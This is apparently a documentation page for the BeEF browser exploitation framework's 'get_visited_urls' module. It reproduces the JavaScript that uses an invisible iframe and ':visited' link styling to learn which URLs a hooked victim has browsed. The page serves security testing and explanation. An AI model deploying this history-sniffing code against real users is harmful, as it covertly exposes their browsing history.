## Summary
* **Objective**:This module will detect whether or not the hooked browser has visited the specified URL(s)
* **Date**: December 2011, Idea discovered in 2006
* **Author**: passbe
* **Browsers**: IE6:7 / Firefox 3 / Chrome 1:5 / Safari 3 / Opera 1:10
* [Code](https://github.com/beefproject/beef/tree/master/modules/browser/get_visited_urls)

## Internal working

This module uses the **beef.browser.hasVisited** function of the BeEF API ([here](https://github.com/beefproject/beef/blob/master/core/main/client/browser.js)] :
```javascript
hasVisited: function(urls) {
    var results = new Array();
    var iframe = beef.dom.createInvisibleIframe();
    var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
    ifdoc.open();
    ifdoc.write('<style>a:visited{width:0px !important;}</style>');
    ifdoc.close();
    urls = urls.split("\n");
    var count = 0;
    for (var i in urls) {
        var u = urls[i];
        if (u != "" || u != null){
            var success = false;
            var a = ifdoc.createElement('a');
            a.href = u;
            ifdoc.body.appendChild(a);
            var width = null;
            (a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width");
            if (width == '0px') {
                success = true;
            }
            results.push({'url':u, 'visited':success});
            count++;
        }
    }
    beef.dom.removeElement(iframe);
    if (results.length == 0) {
        return false;
    }
    return results;
},
```
Basically, it loads a URL and look if the style has been automatically changed by the browser because the user already reached that URL.

##Feedback

##References
* http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html